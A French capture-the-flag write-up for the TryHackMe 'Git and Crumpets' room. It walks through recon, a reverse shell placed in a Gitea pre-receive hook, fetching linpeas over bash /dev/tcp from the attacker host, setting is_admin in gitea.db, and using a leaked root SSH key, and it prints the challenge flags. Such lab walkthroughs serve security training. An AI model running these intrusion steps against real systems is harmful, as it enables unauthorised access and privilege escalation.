# Git and Crumpets #

## Task 1 Start the VM ##

## Task 2 Git the flags! ##

**User Flag**   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.184.151 git.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A git.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-27 18:32 CEST
Nmap scan report for git.thm (10.10.184.151)
Host is up (0.033s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|_  3072 d5:33:1f:04:50:a3:f8:9b:a5:d5:55:10:04:52:83:69 (RSA)
80/tcp   open   http       nginx
| http-title: 503 Service Temporarily Unavailable
|_Requested resource was http://git.thm/index.html
9090/tcp closed zeus-admin
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Infomir MAG-250 set-top box (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Ubiquiti AirOS 5.5.9 (90%), Linux 5.0 - 5.4 (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.3 (89%), Linux 2.6.32 - 3.1 (89%), Linux 3.10 - 3.13 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   32.67 ms 10.9.0.1
2   33.00 ms git.thm (10.10.184.151)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 249.88 seconds
```

Nmap nous montre 2 services ouverts qui sont :   
Le service SSH sur le port 22.    
Le service HTTP sur le port 80.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://git.thm -s | head -20
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Go away!</title>
  </head>
  <body>
    <main>
      <h1>Nothing to see here, move along</h1>
      <h2>Notice:</h2>
      <p> 
        Hey guys,
           I set up the dev repos at git.git-and-crumpets.thm, but I haven't gotten around to setting up the DNS yet. 
           In the meantime, here's a fun video I found!
        Hydra
      </p>
      <pre>
::::::::::::::::::::::;::::;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;iiiiii;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;iii;;iiiii;iiii;;;;;;;;;;;;;;;;;;;
(23) Failed writing body
tim@kali:~/Bureau/tryhackme/write-up$ 
```

On trouve un sous domaine dns pour le site qui est : git.git-and-crumpets.thm.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.38.185 git.git-and-crumpets.thm' >> /etc/hosts" 
```

![page](./Task1-01.png)  

On change de sous domaine.  
On tombe sur une page qui fait fonctionner Gitea.   

![page](./Task1-02.png)  

On se fait un nouveau compte.   

![page](./Task1-03.png)  

Dans le profile de scones on trouve notre sont adresse mail qui est : withcream@example.com 

```bash
tim@kali:~/Bureau/tryhackme/write-up$ strings 3fc2cde6ac97e8c8a0c8b202e527d56d.png | head
IHDR
8tEXtDescription
My 'Password' should be easy enough to guess
IDATx
q&XU
7AI$
]5kW
>|#Y
E7V:W*555}
6so:
```

Dans l'image qui représente l'avatar de scones on trouve dans les chaînes de caractères le mot de passe qui est : Password.   

![page](./Task1-04.png)  

On se connecte sur le profile de scones.   

![page](./Task1-05.png)  
![page](./Task1-06.png)  

Dans setting->Git Hooks->pre-receive.   
Dedans il faut mettre un reverse shell.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 9001
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

On écoute le port 9001 pour avoir le shell.  

On met à jour le pre-receive.   

![page](./Task1-07.png)  

On modifie le README.md.   
Et ça lance le shell.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 9001
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.38.185.
Ncat: Connection from 10.10.38.185:35620.
bash: cannot set terminal process group (855): Inappropriate ioctl for device
bash: no job control in this shell
[git@git-and-crumpets cant-touch-this.git]$ 

id
uid=993(git) gid=990(git) groups=990(git) context=system_u:system_r:unconfined_service_t:s0

[git@git-and-crumpets ~]$ cat user.txt
cat user.txt
dGhte2ZkN2FiOWZmZDQwOTA2NGYyNTdjZDcwY2YzZDZhYTE2fQ==
[git@git-and-crumpets ~]$ cat user.txt | base64 -d
cat user.txt | base64 -d
thm{fd7ab9ffd409064f257cd70cf3d6aa16}
```

Dans le répertoire home on trouve un fichier user.txt.  
Quand on le lit il est en base64.   
On decode le fichier et on trouve le flag.    
Le flag est : thm{fd7ab9ffd409064f257cd70cf3d6aa16}

```bash
[git@git-and-crumpets ~]$ python3 -c 'import pty;pty.spawn("/bin/bash")'

tim@kali:~/Bureau/tryhackme/write-up$ wget https://raw.githubusercontent.com/timruff/PEASS-ng/master/linPEAS/linpeas.sh -nv
2021-10-27 21:17:03 URL:https://raw.githubusercontent.com/timruff/PEASS-ng/master/linPEAS/linpeas.sh [470149/470149] -> "linpeas.sh" [1]
tim@kali:~/Bureau/tryhackme/write-up$ nc -l -p 1234 < linpeas.sh 
---------------
[git@git-and-crumpets tmp]$ bash -c 'cat < /dev/tcp/10.9.228.66/1234 > linpeas.sh'

[git@git-and-crumpets tmp]$ chmod +x linpeas.sh
chmod +x linpeas.sh

[git@git-and-crumpets tmp]$ ./linpeas.sh
./linpeas.sh
...
╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found: "/var/lib/dnf/history.sqlite": cannot open `"/var/lib/dnf/history.sqlite"' (No such file or directory)
Found: "/var/lib/fail2ban/fail2ban.sqlite3": cannot open `"/var/lib/fail2ban/fail2ban.sqlite3"' (No such file or directory)
Found: "/var/lib/gitea/data/gitea.db": cannot open `"/var/lib/gitea/data/gitea.db"' (No such file or directory)
 -> Extracting tables from /var/lib/dnf/history.sqlite (limit 20)

 -> Extracting tables from /var/lib/gitea/data/gitea.db (limit 20)
...
```

On transfert linpeas.sh.  
On regarde les informations qu'il recupères.  
On trouve une base de donnée gitea.db.  

```bash
sqlite3 /var/lib/gitea/data/gitea.db
SQLite version 3.26.0 2018-12-01 12:34:55
Enter ".help" for usage hints.
sqlite> .table
.table
access                     org_user                 
access_token               project                  
action                     project_board            
attachment                 project_issue            
collaboration              protected_branch         
comment                    public_key               
commit_status              pull_request             
deleted_branch             reaction                 
deploy_key                 release                  
email_address              repo_indexer_status      
email_hash                 repo_redirect            
external_login_user        repo_topic               
follow                     repo_transfer            
gpg_key                    repo_unit                
gpg_key_import             repository               
hook_task                  review                   
issue                      session                  
issue_assignees            star                     
issue_dependency           stopwatch                
issue_label                task                     
issue_user                 team                     
issue_watch                team_repo                
label                      team_unit                
language_stat              team_user                
lfs_lock                   topic                    
lfs_meta_object            tracked_time             
login_source               two_factor               
milestone                  u2f_registration         
mirror                     upload                   
notice                     user                     
notification               user_open_id             
oauth2_application         user_redirect            
oauth2_authorization_code  version                  
oauth2_grant               watch                    
oauth2_session             webhook   

.schema user
CREATE TABLE `user` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `lower_name` TEXT NOT NULL, `name` TEXT NOT NULL, `full_name` TEXT NULL, `email` TEXT NOT NULL, `keep_email_private` INTEGER NULL, `email_notifications_preference` TEXT DEFAULT 'enabled' NOT NULL, `passwd` TEXT NOT NULL, `passwd_hash_algo` TEXT DEFAULT 'argon2' NOT NULL, `must_change_password` INTEGER DEFAULT 0 NOT NULL, `login_type` INTEGER NULL, `login_source` INTEGER DEFAULT 0 NOT NULL, `login_name` TEXT NULL, `type` INTEGER NULL, `location` TEXT NULL, `website` TEXT NULL, `rands` TEXT NULL, `salt` TEXT NULL, `language` TEXT NULL, `description` TEXT NULL, `created_unix` INTEGER NULL, `updated_unix` INTEGER NULL, `last_login_unix` INTEGER NULL, `last_repo_visibility` INTEGER NULL, `max_repo_creation` INTEGER DEFAULT -1 NOT NULL, `is_active` INTEGER NULL, `is_admin` INTEGER NULL, `is_restricted` INTEGER DEFAULT 0 NOT NULL, `allow_git_hook` INTEGER NULL, `allow_import_local` INTEGER NULL, `allow_create_organization` INTEGER DEFAULT 1 NULL, `prohibit_login` INTEGER DEFAULT 0 NOT NULL, `avatar` TEXT NOT NULL, `avatar_email` TEXT NOT NULL, `use_custom_avatar` INTEGER NULL, `num_followers` INTEGER NULL, `num_following` INTEGER DEFAULT 0 NOT NULL, `num_stars` INTEGER NULL, `num_repos` INTEGER NULL, `num_teams` INTEGER NULL, `num_members` INTEGER NULL, `visibility` INTEGER DEFAULT 0 NOT NULL, `repo_admin_change_team_access` INTEGER DEFAULT 0 NOT NULL, `diff_view_style` TEXT DEFAULT '' NOT NULL, `theme` TEXT DEFAULT '' NOT NULL, `keep_activity_private` INTEGER DEFAULT 0 NOT NULL);
CREATE UNIQUE INDEX `UQE_user_name` ON `user` (`name`);
CREATE UNIQUE INDEX `UQE_user_lower_name` ON `user` (`lower_name`);
CREATE INDEX `IDX_user_created_unix` ON `user` (`created_unix`);
CREATE INDEX `IDX_user_updated_unix` ON `user` (`updated_unix`);
CREATE INDEX `IDX_user_last_login_unix` ON `user` (`last_login_unix`);
CREATE INDEX `IDX_user_is_active` ON `user` (`is_active`);

sqlite> select * from user;
select * from user;
1|hydra|hydra||hydragyrum@example.com|0|enabled|9b020d3e158bc31b5fe64d668d94cab38cadc6721a5fdf7a4b1fb7bf97021c5e68f56bd9bd44d5ce9547e5e234086342c4e4|pbkdf2|0|0|0||0|||XGySX7uBlc|3C4NzJWN9e|en-US||1618386984|1621615239|1621614217|0|-1|1|1|0|0|0|0|0|d91f03c868d38ecf84ab3cc54f876106|hydragyrum@example.com|1|0|0|0|1|0|0|0|0|unified|arc-green|0
2|root|root|groot|root@example.com|0|enabled|2181d2b5fbf1859db426bcb94d97851d9a0e87a5eb47c5edc7f92bffc45b679e554c8367084f379e59936b68c0d770823ec9|pbkdf2|0|0|0||0|||2VK8fSxvIZ|5e5xPrzvBr|en-US||1618391049|1621716065|1621716065|1|-1|1|0|1|0|0|0|0|b2b218891f86ea980812a5b934ecec1a|root@examle.com|1|0|0|0|1|0|0|0|0|unified|gitea|0
3|scones|scones||withcream@example.com|0|enabled|8d0386b217e0f1ad5a1012d879ce93c9d77fd79d888410fdee9e76ec58d6fa017042906dd9a2ea498d3fd5a7486a73875660|pbkdf2|0|0|0||0|Her Majesty's Secret Service||IF60pw0rVc|13y4Vtc2AH|en-US|I like scones.|1618492621|1635357630|1635357450|0|-1|1|0|0|1|0|0|0|3fc2cde6ac97e8c8a0c8b202e527d56d|jackel@example.com|1|0|0|0|1|0|0|0|0|unified|gitea|0
4|test|test||test@test.thm|0|enabled|d3463d9c205751364af7850bca7956d0f5cc0eb125a097db54fd0087eec31cec1912245e57fdfc53423a89e6684a15f8939a|pbkdf2|0|0|0||0|||oe4oKzc3mk|EgtShiimON|en-US||1618526457|1618526530|1618526457|0|-1|1|0|0|0|0|0|0|15c9bc2cfbc7b7fd0b627422d8189173|test@test.thm|0|0|0|0|0|0|0|0|0|unified|gitea|0
5|toto|toto||toto@toto.toto|0|enabled|05ba8bfe99181371f3984207933e9652161189b7075dd0f2972773d0dee2e08a776b44a9df1d838b88beadf8e4decbf856e7|pbkdf2|0|0|0||0|||sP7kNDncPy|cvYjUVsAoj|en-US||1635356634|1635356635|1635356634|0|-1|1|0|0|0|0|0|0|5350452fc0bf992c6b40462e832c1adf|toto@toto.toto|0|0|0|0|0|0|0|0|0||gitea|0

sqlite> UPDATE user SET is_admin=1 WHERE id=3;
UPDATE user SET is_admin=1 WHERE id=3;

```

Avec sqlite 3, on regarde les tables de la base de donnée.  
On regarde la structure de la table user et on remarque qu'il une colonne id et une au est is_admin.  
On regarde la table on vois que scones est à l'id 3.  
On dit que scone est un administrateur en changeant is_admin=0 par is_admin=1.   

![page](./Task1-08.png)  

On retourne sur la page de scones et on trouve root / backup.   

![page](./Task1-09.png)  
![page](./Task1-10.png) 

Dans la branch dotfile dans commits on trouve une ssh de root et la phrase passe qui est : Sup3rS3cur3  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat key
-----BEGIN OPENSSH PRIVATE KEY-----
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
f+V62ikG7042lp/fhTYiDgRfvXA=
-----END OPENSSH PRIVATE KEY-----
tim@kali:~/Bureau/tryhackme/write-up$ chmod 600 key

tim@kali:~/Bureau/tryhackme/write-up$ ssh -i key root@git.thm
Enter passphrase for key 'key': 
Last login: Sat Jul  3 21:36:13 2021 from 192.168.247.1
[root@git-and-crumpets ~]# cat /root/root.txt
dGhtezYzMjAyMjhkZDllMzE1ZjI4M2I3NTg4NzI0MGRjNmExfQ==
[root@git-and-crumpets ~]# echo 'dGhtezYzMjAyMjhkZDllMzE1ZjI4M2I3NTg4NzI0MGRjNmExfQ==' | base64 -d
thm{6320228dd9e315f283b75887240dc6a1}
```

On se connecte sur le secure shell sous l'utilisateur root.   
On lit le fichier root.txt dans le répertoire root.    
On décode le message en base64 et on a le flag.   
Le flag est : thm{6320228dd9e315f283b75887240dc6a1}    
